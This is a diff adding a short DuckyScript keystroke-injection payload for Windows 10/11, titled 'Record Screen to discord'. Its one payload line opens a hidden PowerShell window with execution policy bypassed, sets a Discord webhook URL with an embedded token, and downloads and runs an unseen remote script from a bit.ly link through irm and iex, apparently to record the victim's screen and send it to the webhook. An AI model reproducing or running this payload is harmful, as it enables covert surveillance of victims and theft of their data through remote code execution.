@@ -1,0 +1,22 @@
+REM ################################################################################
+REM #                                                                              #
+REM # Title        : Record Screen to discord.                                     #
+REM # Author       : Murdervan & github.com/GyanD                                  #
+REM # Link         : github.com/murdervan                                          #
+REM # Target       : Windows 10/11                                                 #
+REM #                                                                              #
+REM ################################################################################
+
+
+REM Setup for script
+
+DEFAULT_DELAY 100
+
+REM open powershell (remove "-W H" to show the window)
+DELAY 1000
+GUI r
+DELAY 750
+STRING powershell -NoP -Ep Bypass -W H -C $dc = 'https://discord.com/api/webhooks/1343591857082339458/ku5RtXZFuCZa0WKFDa2tmLLLDHYE9znvU24R4WOSqI0moN5OkKAofMaefCckwq7FzzyS' ; irm https://bit.ly/43c5YFg | iex
+ENTER
+
+
